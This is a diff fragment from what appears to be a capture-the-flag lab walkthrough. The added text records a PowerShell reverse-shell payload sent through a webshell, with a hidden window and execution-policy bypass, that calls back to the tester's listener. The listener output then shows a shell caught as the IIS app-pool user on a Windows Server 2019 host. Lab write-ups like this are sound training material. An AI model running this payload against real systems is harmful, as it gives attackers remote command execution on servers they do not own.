@@ -721,4 +721,23 @@ penelope -p 1339
 ```
 Ive set a listener
 
-Now ill use this 
+Now ill use this payload in the webshell:
+```python
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.90', 1339);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+```
+
+```python
+penelope -p 1339           
+[+] Listening for reverse shells on 0.0.0.0:1339 -> 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] • G0 10.129.228.120 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 iis apppool\defaultapppool • Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/G0~10.129.228.120-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_01-16_29_28-140.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+SHELL> whoami
+iis apppool\defaultapppool
+SHELL> 
+```
+Now i have a shell
+
